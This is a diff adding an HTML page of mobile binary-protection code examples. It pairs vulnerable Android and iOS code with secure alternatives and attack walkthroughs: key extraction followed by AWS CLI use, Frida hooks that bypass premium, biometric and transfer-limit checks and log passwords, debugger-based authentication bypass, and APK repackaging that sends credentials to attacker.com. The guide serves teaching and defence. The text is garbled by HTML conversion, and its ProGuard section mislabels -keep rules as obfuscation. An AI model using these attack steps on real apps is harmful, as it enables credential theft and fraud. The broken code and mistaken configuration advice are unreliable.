@@ -215,7 +215,1655 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>M07: Insufficient Binary Protections - Code Examples</h1>
+
+<h2>Table of Contents</h2>
+<ol>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#vulnerable-examples">Vulnerable Examples</a></li>
+<li><a href="#secure-examples">Secure Examples</a></li>
+<li><a href="#common-vulnerable-patterns">Common Vulnerable Patterns</a></li>
+<li><a href="#secure-implementation-patterns">Secure Implementation Patterns</a></li>
+<li><a href="#framework-specific-examples">Framework-Specific Examples</a></li>
+<li><a href="#comparison-tables">Comparison Tables</a></li>
+</ol>
+
+<p>---</p>
+
+<h2>Introduction</h2>
+
+<p>This document provides practical code examples demonstrating insufficient binary protections and their secure alternatives. Each example shows:</p>
+<ul>
+<li>❌ <strong>Vulnerable Code</strong>: What NOT to do</li>
+<li>✅ <strong>Secure Code</strong>: Recommended implementation</li>
+<li><strong>Why It's Vulnerable</strong>: Explanation of the security risk</li>
+<li><strong>Attack Scenario</strong>: How an attacker would exploit it</li>
+<li><strong>Risk Level</strong>: Severity assessment</li>
+</ul>
+
+<strong>⚠️ DISCLAIMER</strong>: Vulnerable examples are for educational purposes only. Never use these patterns in production applications.
+
+<p>---</p>
+
+<h2>Vulnerable Examples</h2>
+
+<h3>Example 1: Hardcoded API Keys</h3>
+
+<h4>❌ VULNERABLE: API Keys in Source Code</h4>
+
+<strong>Android (Kotlin):</strong>
+<p>``<code>kotlin</p>
+<p>// ApiClient.kt - VULNERABLE</p>
+<p>package com.company.app.network</p>
+
+<p>object ApiClient {</p>
+<p>    // VULNERABILITY: Hardcoded API keys</p>
+<p>    private const val STRIPE_API_KEY = "[REDACTED]"</p>
+<p>    private const val AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"</p>
+<p>    private const val AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</p>
+<p>    private const val API_BASE_URL = "https://api.company.com/v1/"</p>
+    
+<p>    fun makePayment(amount: Double): Boolean {</p>
+<p>        val request = Request.Builder()</p>
+<p>            .url("$API_BASE_URL/payments")</p>
+<p>            .addHeader("Authorization", "Bearer $STRIPE_API_KEY")</p>
+<p>            .post(createPaymentBody(amount))</p>
+<p>            .build()</p>
+            
+<p>        // Process payment</p>
+<p>        return true</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>iOS (Swift):</strong>
+</code>`<code>swift
+<p>// APIManager.swift - VULNERABLE</p>
+<p>import Foundation</p>
+
+<p>class APIManager {</p>
+<p>    // VULNERABILITY: Hardcoded credentials</p>
+<p>    private let stripeKey = "[REDACTED]"</p>
+<p>    private let awsAccessKey = "AKIAIOSFODNN7EXAMPLE"</p>
+<p>    private let awsSecretKey = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</p>
+<p>    private let baseURL = "https://api.company.com/v1/"</p>
+    
+<p>    func processPayment(amount: Double, completion: @escaping (Bool) -> Void) {</p>
+<p>        var request = URLRequest(url: URL(string: "\(baseURL)payments")!)</p>
+<p>        request.setValue("Bearer \(stripeKey)", forHTTPHeaderField: "Authorization")</p>
+        
+<p>        // Make request</p>
+<p>        URLSession.shared.dataTask(with: request) { _, _, _ in</p>
+<p>            completion(true)</p>
+<p>        }.resume()</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable:</strong>
+<ul>
+<li>API keys visible in decompiled code (takes 2 minutes with jadx/Hopper)</li>
+<li>Simple string extraction reveals all secrets: </code>strings app.apk | grep "sk_live"<code></li>
+<li>No obfuscation protects these values</li>
+<li>Keys can't be rotated without app update</li>
+</ul>
+
+<strong>Attack Scenario:</strong>
+</code>`<code>bash
+<h1>Attacker's process (5 minutes total)</h1>
+<p>$ wget https://play.google.com/download/app.apk  # Download from device</p>
+<p>$ strings app.apk | grep -E "(sk_live|AKIA)"     # Extract keys</p>
+
+<p>Output:</p>
+<p>[REDACTED]</p>
+<p>AKIAIOSFODNN7EXAMPLE</p>
+<p>wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</p>
+
+<h1>Now attacker has full Stripe and AWS access</h1>
+<p>$ aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE</p>
+<p>$ aws s3 ls  # Access all S3 buckets</p>
+<p>$ # Stripe API can be used for fraudulent charges</p>
+</code>`<code>
+
+<strong>Risk Level:</strong> 🔴 CRITICAL  
+<strong>Impact:</strong> Complete API compromise, unauthorized cloud resource usage, financial fraud
+
+<p>---</p>
+
+<h3>Example 2: No Code Obfuscation</h3>
+
+<h4>❌ VULNERABLE: Readable Business Logic</h4>
+
+<strong>Android (Java):</strong>
+</code>`<code>java
+<p>// PremiumManager.java - VULNERABLE (No obfuscation)</p>
+<p>package com.company.app.billing;</p>
+
+<p>public class PremiumManager {</p>
+    
+<p>    private Context context;</p>
+<p>    private static final String PREF_NAME = "premium_prefs";</p>
+<p>    private static final String KEY_PREMIUM = "is_premium";</p>
+    
+<p>    public PremiumManager(Context context) {</p>
+<p>        this.context = context;</p>
+<p>    }</p>
+    
+<p>    // VULNERABILITY: Local premium check only</p>
+<p>    public boolean isPremiumUser() {</p>
+<p>        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);</p>
+<p>        return prefs.getBoolean(KEY_PREMIUM, false);</p>
+<p>    }</p>
+    
+<p>    // VULNERABILITY: Easy to bypass</p>
+<p>    public void unlockPremiumFeatures() {</p>
+<p>        if (isPremiumUser()) {</p>
+<p>            enableFeature("advanced_analytics");</p>
+<p>            enableFeature("unlimited_exports");</p>
+<p>            enableFeature("premium_templates");</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    private void enableFeature(String featureName) {</p>
+<p>        // Feature implementation</p>
+<p>        Log.d("Premium", "Enabled feature: " + featureName);</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Decompiled Code (What Attacker Sees):</strong>
+</code>`<code>java
+<p>// Identical to source code (no obfuscation)</p>
+<p>package com.company.app.billing;</p>
+
+<p>public class PremiumManager {</p>
+<p>    // Attacker can immediately understand:</p>
+<p>    // 1. Premium status stored in SharedPreferences</p>
+<p>    // 2. Key is "is_premium"</p>
+<p>    // 3. No server validation</p>
+<p>    // 4. Can modify SharedPreferences to bypass</p>
+    
+<p>    public boolean isPremiumUser() {</p>
+<p>        SharedPreferences prefs = this.context.getSharedPreferences("premium_prefs", 0);</p>
+<p>        return prefs.getBoolean("is_premium", false);</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack:</strong>
+</code>`<code>bash
+<h1>Method 1: Modify SharedPreferences directly (rooted device)</h1>
+<p>adb shell</p>
+<p>su</p>
+<p>cd /data/data/com.company.app/shared_prefs/</p>
+<p>cat premium_prefs.xml</p>
+
+<h1>Edit XML file:</h1>
+<boolean name="is_premium" value="true" />
+
+<h1>Method 2: Frida hook (even without root)</h1>
+<p>frida -U -f com.company.app -l bypass.js</p>
+
+<h1>bypass.js</h1>
+<p>Java.perform(function() {</p>
+<p>    var PremiumManager = Java.use('com.company.app.billing.PremiumManager');</p>
+<p>    PremiumManager.isPremiumUser.implementation = function() {</p>
+<p>        return true;  // Always premium</p>
+<p>    };</p>
+<p>});</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable:</strong>
+<ul>
+<li>Class, method, variable names are human-readable</li>
+<li>Business logic completely exposed</li>
+<li>Attack vector obvious (local SharedPreferences check)</li>
+<li>Takes attacker 10 minutes to bypass</li>
+</ul>
+
+<strong>Risk Level:</strong> 🔴 HIGH  
+<strong>Impact:</strong> Revenue loss from bypassed premium features, easy piracy
+
+<p>---</p>
+
+<h3>Example 3: Debuggable Production Build</h3>
+
+<h4>❌ VULNERABLE: Debug Mode Enabled</h4>
+
+<strong>AndroidManifest.xml:</strong>
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.company.bankingapp"></p>
+    
+    <!-- VULNERABILITY: Debuggable in production -->
+    <application
+<p>        android:name=".BankingApplication"</p>
+<p>        android:allowBackup="true"</p>
+<p>        android:debuggable="true"</p>
+<p>        android:icon="@mipmap/ic_launcher"</p>
+<p>        android:label="@string/app_name"</p>
+<p>        android:theme="@style/AppTheme"></p>
+        
+        <activity android:name=".LoginActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <activity android:name=".TransferActivity" />
+        <activity android:name=".BalanceActivity" />
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>build.gradle (also vulnerable):</strong>
+</code>`<code>groovy
+<p>android {</p>
+<p>    buildTypes {</p>
+<p>        release {</p>
+<p>            // VULNERABILITY: Debugging enabled in release</p>
+<p>            debuggable true</p>
+<p>            minifyEnabled false  // No obfuscation</p>
+<p>            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack:</strong>
+</code>`<code>bash
+<h1>Verify app is debuggable</h1>
+<p>adb shell dumpsys package com.company.bankingapp | grep debuggable</p>
+<h1>Output: debuggable=true</h1>
+
+<h1>Enable debugging</h1>
+<p>adb shell am set-debug-app -w com.company.bankingapp</p>
+
+<h1>Get PID</h1>
+<p>adb shell ps | grep bankingapp</p>
+<h1>Output: u0_a123  12345  ...  com.company.bankingapp</h1>
+
+<h1>Attach debugger</h1>
+<p>adb forward tcp:8700 jdwp:12345</p>
+<p>jdb -attach localhost:8700</p>
+
+<h1>Inside debugger, set breakpoint on login</h1>
+<p>> stop in com.company.bankingapp.LoginActivity.validateCredentials</p>
+<p>> run</p>
+
+<h1>App executes, breakpoint hits</h1>
+<p>> locals</p>
+<p>username = "victim@email.com"</p>
+<p>password = "UserPassword123!"  // Credentials exposed!</p>
+
+<h1>Modify authentication result</h1>
+<p>> set authenticated = true</p>
+<p>> cont</p>
+<h1>Logged in as victim without valid credentials!</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable:</strong>
+<ul>
+<li>Allows real-time debugging of production app</li>
+<li>Can inspect all variables, including passwords and tokens</li>
+<li>Can modify execution flow (skip authentication)</li>
+<li>No skill required (Android Studio does everything)</li>
+</ul>
+
+<strong>Risk Level:</strong> 🔴 CRITICAL  
+<strong>Impact:</strong> Complete application compromise, credential theft, authentication bypass
+
+<p>---</p>
+
+<h3>Example 4: No Root/Jailbreak Detection</h3>
+
+<h4>❌ VULNERABLE: No Environment Checks</h4>
+
+<strong>Android (Kotlin):</strong>
+</code>`<code>kotlin
+<p>// MainActivity.kt - VULNERABLE</p>
+<p>package com.company.bankingapp</p>
+
+<p>class MainActivity : AppCompatActivity() {</p>
+    
+<p>    override fun onCreate(savedInstanceState: Bundle?) {</p>
+<p>        super.onCreate(savedInstanceState)</p>
+<p>        setContentView(R.layout.activity_main)</p>
+        
+<p>        // VULNERABILITY: No root detection</p>
+<p>        // App runs normally on rooted devices</p>
+<p>        // Frida, Xposed can hook any function</p>
+        
+<p>        initializeApp()</p>
+<p>        loadUserData()</p>
+<p>    }</p>
+    
+<p>    private fun initializeApp() {</p>
+<p>        // Initialize banking features</p>
+<p>        // No security checks whatsoever</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>iOS (Swift):</strong>
+</code>`<code>swift
+<p>// AppDelegate.swift - VULNERABLE</p>
+<p>import UIKit</p>
+
+<p>@UIApplicationMain</p>
+<p>class AppDelegate: UIResponder, UIApplicationDelegate {</p>
+    
+<p>    var window: UIWindow?</p>
+    
+<p>    func application(_ application: UIApplication,</p>
+<p>                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {</p>
+        
+<p>        // VULNERABILITY: No jailbreak detection</p>
+<p>        // App runs on jailbroken devices</p>
+<p>        // Cycript, Frida can manipulate app</p>
+        
+<p>        setupApp()</p>
+<p>        return true</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack on Rooted/Jailbroken Device:</strong>
+</code>`<code>bash
+<h1>Install Frida on rooted device</h1>
+<p>adb push frida-server /data/local/tmp/</p>
+<p>adb shell "chmod 755 /data/local/tmp/frida-server"</p>
+<p>adb shell "/data/local/tmp/frida-server &"</p>
+
+<h1>Bypass all security checks</h1>
+<p>frida -U -f com.company.bankingapp -l universal-bypass.js</p>
+
+<h1>universal-bypass.js - Bypasses everything</h1>
+<p>Java.perform(function() {</p>
+<p>    // Bypass biometric</p>
+<p>    var BiometricManager = Java.use('com.company.bankingapp.BiometricManager');</p>
+<p>    BiometricManager.authenticate.implementation = function() {</p>
+<p>        console.log('[+] Biometric bypassed');</p>
+<p>        this.onAuthSuccess();  // Force success</p>
+<p>    };</p>
+    
+<p>    // Bypass transaction limits</p>
+<p>    var TransferManager = Java.use('com.company.bankingapp.TransferManager');</p>
+<p>    TransferManager.getTransferLimit.implementation = function() {</p>
+<p>        return 999999999;  // Unlimited</p>
+<p>    };</p>
+    
+<p>    // Log all sensitive data</p>
+<p>    var LoginActivity = Java.use('com.company.bankingapp.LoginActivity');</p>
+<p>    LoginActivity.login.implementation = function(user, pass) {</p>
+<p>        console.log('[+] Username: ' + user);</p>
+<p>        console.log('[+] Password: ' + pass);</p>
+<p>        return this.login(user, pass);</p>
+<p>    };</p>
+<p>});</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable:</strong>
+<ul>
+<li>No detection of compromised device environment</li>
+<li>Frida/Xposed can hook any function</li>
+<li>All app-level protections can be bypassed</li>
+<li>Certificate pinning can be disabled</li>
+</ul>
+
+<strong>Risk Level:</strong> 🔴 HIGH  
+<strong>Impact:</strong> All security controls can be bypassed on rooted devices
+
+<p>---</p>
+
+<h3>Example 5: No Integrity Verification</h3>
+
+<h4>❌ VULNERABLE: Missing Signature Checks</h4>
+
+<strong>Android (Kotlin):</strong>
+</code>`<code>kotlin
+<p>// Application.kt - VULNERABLE</p>
+<p>package com.company.app</p>
+
+<p>class MyApplication : Application() {</p>
+    
+<p>    override fun onCreate() {</p>
+<p>        super.onCreate()</p>
+        
+<p>        // VULNERABILITY: No signature verification</p>
+<p>        // App doesn't verify it hasn't been repackaged</p>
+<p>        // Modified versions run without detection</p>
+        
+<p>        initializeApp()</p>
+<p>    }</p>
+    
+<p>    private fun initializeApp() {</p>
+<p>        // App initialization</p>
+<p>        // Assumes this is the legitimate version</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Attack - Repackaging:</strong>
+</code>`<code>bash
+<h1>Step 1: Decompile</h1>
+<p>apktool d original-bank-app.apk -o decompiled/</p>
+
+<h1>Step 2: Inject malicious code</h1>
+<p>cd decompiled/smali/com/company/app/</p>
+<p>nano LoginActivity.smali</p>
+
+<h1>Add credential stealing code at login method</h1>
+<p>.method private login(Ljava/lang/String;Ljava/lang/String;)V</p>
+<p>    # Original login code...</p>
+    
+<p>    # INJECTED: Send credentials to attacker</p>
+<p>    const-string v0, "http://attacker.com/steal.php"</p>
+<p>    # ... network code to send username/password ...</p>
+    
+<p>    # Continue with original login</p>
+<p>.end method</p>
+
+<h1>Step 3: Recompile</h1>
+<p>apktool b decompiled/ -o modified-bank-app.apk</p>
+
+<h1>Step 4: Sign with debug key</h1>
+<p>jarsigner -keystore ~/.android/debug.keystore modified-bank-app.apk androiddebugkey</p>
+
+<h1>Step 5: Distribute</h1>
+<h1>Upload to third-party store or send via phishing</h1>
+
+<h1>Result: App works perfectly, users can't tell difference</h1>
+<h1>But all credentials sent to attacker</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable:</strong>
+<ul>
+<li>App doesn't verify its own signature</li>
+<li>Modified versions indistinguishable to users</li>
+<li>Malicious code injection goes undetected</li>
+<li>Can be distributed as "update" or "mod"</li>
+</ul>
+
+<strong>Risk Level:</strong> 🔴 CRITICAL  
+<strong>Impact:</strong> Malware distribution, credential theft, brand damage
+
+<p>---</p>
+
+<h2>Secure Examples</h2>
+
+<h3>Example 1: Secure Key Management</h3>
+
+<h4>✅ SECURE: Android KeyStore Implementation</h4>
+
+</code>`<code>kotlin
+<p>// SecureKeyManager.kt - SECURE</p>
+<p>package com.company.app.security</p>
+
+<p>import android.security.keystore.KeyGenParameterSpec</p>
+<p>import android.security.keystore.KeyProperties</p>
+<p>import java.security.KeyStore</p>
+<p>import javax.crypto.Cipher</p>
+<p>import javax.crypto.KeyGenerator</p>
+<p>import javax.crypto.SecretKey</p>
+<p>import javax.crypto.spec.GCMParameterSpec</p>
+<p>import android.util.Base64</p>
+
+<p>object SecureKeyManager {</p>
+    
+<p>    private const val KEYSTORE_PROVIDER = "AndroidKeyStore"</p>
+<p>    private const val KEY_ALIAS = "app_master_key"</p>
+<p>    private const val TRANSFORMATION = "AES/GCM/NoPadding"</p>
+<p>    private const val GCM_TAG_LENGTH = 128</p>
+    
+<p>    init {</p>
+<p>        // Generate key on first run</p>
+<p>        if (!keyExists()) {</p>
+<p>            generateKey()</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Generate AES key in Android KeyStore (hardware-backed if available)</li>
+</ul>
+<p>     */</p>
+<p>    private fun generateKey() {</p>
+<p>        val keyGenerator = KeyGenerator.getInstance(</p>
+<p>            KeyProperties.KEY_ALGORITHM_AES,</p>
+<p>            KEYSTORE_PROVIDER</p>
+<p>        )</p>
+        
+<p>        val builder = KeyGenParameterSpec.Builder(</p>
+<p>            KEY_ALIAS,</p>
+<p>            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT</p>
+<p>        )</p>
+<p>            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)</p>
+<p>            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)</p>
+<p>            .setRandomizedEncryptionRequired(true)</p>
+<p>            .setUserAuthenticationRequired(false)  // Set true for biometric protection</p>
+        
+<p>        keyGenerator.init(builder.build())</p>
+<p>        keyGenerator.generateKey()</p>
+<p>    }</p>
+    
+<p>    private fun keyExists(): Boolean {</p>
+<p>        val keyStore = KeyStore.getInstance(KEYSTORE_PROVIDER)</p>
+<p>        keyStore.load(null)</p>
+<p>        return keyStore.containsAlias(KEY_ALIAS)</p>
+<p>    }</p>
+    
+<p>    private fun getKey(): SecretKey {</p>
+<p>        val keyStore = KeyStore.getInstance(KEYSTORE_PROVIDER)</p>
+<p>        keyStore.load(null)</p>
+<p>        return keyStore.getKey(KEY_ALIAS, null) as SecretKey</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Encrypt sensitive data</li>
+<li>@return Base64-encoded "IV:Ciphertext"</li>
+</ul>
+<p>     */</p>
+<p>    fun encrypt(plaintext: String): String {</p>
+<p>        val cipher = Cipher.getInstance(TRANSFORMATION)</p>
+<p>        cipher.init(Cipher.ENCRYPT_MODE, getKey())</p>
+        
+<p>        val iv = cipher.iv</p>
+<p>        val ciphertext = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))</p>
+        
+<p>        // Combine IV and ciphertext</p>
+<p>        val combined = iv + ciphertext</p>
+<p>        return Base64.encodeToString(combined, Base64.NO_WRAP)</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Decrypt sensitive data</li>
+</ul>
+<p>     */</p>
+<p>    fun decrypt(encrypted: String): String {</p>
+<p>        val combined = Base64.decode(encrypted, Base64.NO_WRAP)</p>
+        
+<p>        // Extract IV and ciphertext</p>
+<p>        val iv = combined.copyOfRange(0, 12)  // GCM IV is 12 bytes</p>
+<p>        val ciphertext = combined.copyOfRange(12, combined.size)</p>
+        
+<p>        val cipher = Cipher.getInstance(TRANSFORMATION)</p>
+<p>        val spec = GCMParameterSpec(GCM_TAG_LENGTH, iv)</p>
+<p>        cipher.init(Cipher.DECRYPT_MODE, getKey(), spec)</p>
+        
+<p>        val plaintext = cipher.doFinal(ciphertext)</p>
+<p>        return String(plaintext, Charsets.UTF_8)</p>
+<p>    }</p>
+<p>}</p>
+
+<p>// Usage: Secure API key storage</p>
+<p>object ApiClient {</p>
+<p>    private const val ENCRYPTED_API_KEY_PREF = "enc_api_key"</p>
+    
+<p>    /**</p>
+<ul>
+<li>Store API key securely (called once, key from server)</li>
+</ul>
+<p>     */</p>
+<p>    fun storeApiKey(context: Context, apiKey: String) {</p>
+<p>        val encrypted = SecureKeyManager.encrypt(apiKey)</p>
+<p>        context.getSharedPreferences("secure_prefs", Context.MODE_PRIVATE)</p>
+<p>            .edit()</p>
+<p>            .putString(ENCRYPTED_API_KEY_PREF, encrypted)</p>
+<p>            .apply()</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Retrieve and decrypt API key when needed</li>
+</ul>
+<p>     */</p>
+<p>    private fun getApiKey(context: Context): String {</p>
+<p>        val encrypted = context.getSharedPreferences("secure_prefs", Context.MODE_PRIVATE)</p>
+<p>            .getString(ENCRYPTED_API_KEY_PREF, null)</p>
+<p>            ?: throw IllegalStateException("API key not found")</p>
+        
+<p>        return SecureKeyManager.decrypt(encrypted)</p>
+<p>    }</p>
+    
+<p>    fun makeSecureRequest(context: Context) {</p>
+<p>        val apiKey = getApiKey(context)</p>
+        
+<p>        // Use API key for request</p>
+<p>        val request = Request.Builder()</p>
+<p>            .url("https://api.company.com/data")</p>
+<p>            .addHeader("Authorization", "Bearer $apiKey")</p>
+<p>            .build()</p>
+        
+<p>        // Make request (key used temporarily, not stored in memory)</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Benefits:</strong>
+<ul>
+<li>✅ API key never in source code</li>
+<li>✅ Encrypted at rest using hardware-backed key (if available)</li>
+<li>✅ Key stored in Android KeyStore (can't be extracted)</li>
+<li>✅ Even with root access, key material protected</li>
+<li>✅ Can require biometric auth to decrypt (set userAuthenticationRequired = true)</li>
+</ul>
+
+<h4>✅ SECURE: iOS Keychain Implementation</h4>
+
+</code>`<code>swift
+<p>// KeychainManager.swift - SECURE</p>
+<p>import Foundation</p>
+<p>import Security</p>
+
+<p>enum KeychainError: Error {</p>
+<p>    case duplicateEntry</p>
+<p>    case unknown(OSStatus)</p>
+<p>    case notFound</p>
+<p>}</p>
+
+<p>class KeychainManager {</p>
+    
+<p>    static let shared = KeychainManager()</p>
+<p>    private init() {}</p>
+    
+<p>    /**</p>
+<ul>
+<li>Save sensitive data to Keychain with secure attributes</li>
+</ul>
+<p>     */</p>
+<p>    func save(_ data: Data, forKey key: String) throws {</p>
+<p>        let query: [String: Any] = [</p>
+<p>            kSecClass as String: kSecClassGenericPassword,</p>
+<p>            kSecAttrAccount as String: key,</p>
+<p>            kSecValueData as String: data,</p>
+<p>            // SECURITY: Only accessible when device unlocked</p>
+<p>            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly</p>
+<p>        ]</p>
+        
+<p>        // Delete existing entry</p>
+<p>        SecItemDelete(query as CFDictionary)</p>
+        
+<p>        // Add new entry</p>
+<p>        let status = SecItemAdd(query as CFDictionary, nil)</p>
+        
+<p>        guard status == errSecSuccess else {</p>
+<p>            throw KeychainError.unknown(status)</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Retrieve from Keychain</li>
+</ul>
+<p>     */</p>
+<p>    func load(forKey key: String) throws -> Data {</p>
+<p>        let query: [String: Any] = [</p>
+<p>            kSecClass as String: kSecClassGenericPassword,</p>
+<p>            kSecAttrAccount as String: key,</p>
+<p>            kSecReturnData as String: true,</p>
+<p>            kSecMatchLimit as String: kSecMatchLimitOne</p>
+<p>        ]</p>
+        
+<p>        var result: AnyObject?</p>
+<p>        let status = SecItemCopyMatching(query as CFDictionary, &result)</p>
+        
+<p>        guard status == errSecSuccess else {</p>
+<p>            throw KeychainError.notFound</p>
+<p>        }</p>
+        
+<p>        guard let data = result as? Data else {</p>
+<p>            throw KeychainError.unknown(status)</p>
+<p>        }</p>
+        
+<p>        return data</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Delete from Keychain</li>
+</ul>
+<p>     */</p>
+<p>    func delete(forKey key: String) throws {</p>
+<p>        let query: [String: Any] = [</p>
+<p>            kSecClass as String: kSecClassGenericPassword,</p>
+<p>            kSecAttrAccount as String: key</p>
+<p>        ]</p>
+        
+<p>        let status = SecItemDelete(query as CFDictionary)</p>
+        
+<p>        guard status == errSecSuccess || status == errSecItemNotFound else {</p>
+<p>            throw KeychainError.unknown(status)</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+
+<p>// Extension for String storage</p>
+<p>extension KeychainManager {</p>
+<p>    func save(_ string: String, forKey key: String) throws {</p>
+<p>        guard let data = string.data(using: .utf8) else {</p>
+<p>            throw KeychainError.unknown(errSecParam)</p>
+<p>        }</p>
+<p>        try save(data, forKey: key)</p>
+<p>    }</p>
+    
+<p>    func loadString(forKey key: String) throws -> String {</p>
+<p>        let data = try load(forKey: key)</p>
+<p>        guard let string = String(data: data, encoding: .utf8) else {</p>
+<p>            throw KeychainError.unknown(errSecParam)</p>
+<p>        }</p>
+<p>        return string</p>
+<p>    }</p>
+<p>}</p>
+
+<p>// Usage: Secure API Client</p>
+<p>class APIManager {</p>
+    
+<p>    static let shared = APIManager()</p>
+<p>    private let apiKeyKey = "api_key"</p>
+    
+<p>    /**</p>
+<ul>
+<li>Store API key securely (from server after auth)</li>
+</ul>
+<p>     */</p>
+<p>    func storeAPIKey(_ key: String) {</p>
+<p>        do {</p>
+<p>            try KeychainManager.shared.save(key, forKey: apiKeyKey)</p>
+<p>            print("API key stored securely")</p>
+<p>        } catch {</p>
+<p>            print("Failed to store API key: \(error)")</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    /**</p>
+<ul>
+<li>Make secure API call</li>
+</ul>
+<p>     */</p>
+<p>    func fetchData(completion: @escaping (Result<Data, Error>) -> Void) {</p>
+<p>        // Retrieve API key from Keychain</p>
+<p>        guard let apiKey = try? KeychainManager.shared.loadString(forKey: apiKeyKey) else {</p>
+<p>            completion(.failure(NSError(domain: "API", code: -1, userInfo: [NSLocalizedDescriptionKey: "API key not found"])))</p>
+<p>            return</p>
+<p>        }</p>
+        
+<p>        // Use API key for request</p>
+<p>        var request = URLRequest(url: URL(string: "https://api.company.com/data")!)</p>
+<p>        request.setValue("Bearer \(apiKey)", forHTTPHeaderField: "Authorization")</p>
+        
+<p>        URLSession.shared.dataTask(with: request) { data, response, error in</p>
+<p>            if let error = error {</p>
+<p>                completion(.failure(error))</p>
+<p>                return</p>
+<p>            }</p>
+            
+<p>            completion(.success(data ?? Data()))</p>
+<p>        }.resume()</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Benefits:</strong>
+<ul>
+<li>✅ No hardcoded keys in source</li>
+<li>✅ Keychain encrypted with device hardware key</li>
+<li>✅ Data only accessible when device unlocked</li>
+<li>✅ Survives app uninstall/reinstall</li>
+<li>✅ Secure enclave protection (newer devices)</li>
+</ul>
+
+<p>---</p>
+
+<h3>Example 2: Code Obfuscation with ProGuard</h3>
+
+<h4>✅ SECURE: Properly Configured Obfuscation</h4>
+
+<strong>proguard-rules.pro:</strong>
+</code>`<code>properties
+<h1>==============================================================================</h1>
+<h1>SECURITY-FOCUSED PROGUARD CONFIGURATION</h1>
+<h1>==============================================================================</h1>
+
+<h1>Optimization settings</h1>
+<p>-optimizationpasses 5</p>
+<p>-optimizations !code/simplification/arithmetic,!field/<em>,!class/merging/</em></p>
+<p>-allowaccessmodification</p>
+<p>-verbose</p>
+
+<h1>Obfuscation settings</h1>
+<p>-repackageclasses ''</p>
+<p>-dontusemixedcaseclassnames</p>
+<p>-keepattributes <em>Annotation</em></p>
+<p>-flattenpackagehierarchy 'obf'</p>
+<p>-overloadaggressively</p>
+
+<h1>==============================================================================</h1>
+<h1>REMOVE DEBUG CODE</h1>
+<h1>==============================================================================</h1>
+
+<h1>Remove all logging</h1>
+<p>-assumenosideeffects class android.util.Log {</p>
+<p>    public static <em>*</em> d(...);</p>
+<p>    public static <em>*</em> v(...);</p>
+<p>    public static <em>*</em> i(...);</p>
+<p>    public static <em>*</em> w(...);</p>
+<p>    public static <em>*</em> e(...);</p>
+<p>}</p>
+
+<h1>Remove BuildConfig debug flags</h1>
+<p>-assumenosideeffects class **.BuildConfig {</p>
+<p>    public static final boolean DEBUG return false;</p>
+<p>}</p>
+
+<h1>==============================================================================</h1>
+<h1>SECURITY-CRITICAL CLASSES - HEAVY OBFUSCATION</h1>
+<h1>==============================================================================</h1>
+
+<h1>Obfuscate entire security package</h1>
+<p>-keep class com.company.app.security.<em>* { </em>; }</p>
+<p>-keepclassmembers class com.company.app.security.** {</p>
+<p>    !private <fields>;</p>
+<p>    !private <methods>;</p>
+<p>}</p>
+
+<h1>Obfuscate payment processing</h1>
+<p>-keep class com.company.app.payment.<em>* { </em>; }</p>
+
+<h1>Obfuscate premium/license checks</h1>
+<p>-keep class com.company.app.premium.<em>* { </em>; }</p>
+
+<h1>==============================================================================</h1>
+<h1>KEEP NECESSARY CLASSES (Don't obfuscate)</h1>
+<h1>==============================================================================</h1>
+
+<h1>Keep Application class</h1>
+<p>-keep public class * extends android.app.Application</p>
+
+<h1>Keep Activities, Services, etc. (referenced in manifest)</h1>
+<p>-keep public class * extends android.app.Activity</p>
+<p>-keep public class * extends android.app.Service</p>
+<p>-keep public class * extends android.content.BroadcastReceiver</p>
+<p>-keep public class * extends android.content.ContentProvider</p>
+
+<h1>Keep view constructors (used by XML layouts)</h1>
+<p>-keepclassmembers class * extends android.view.View {</p>
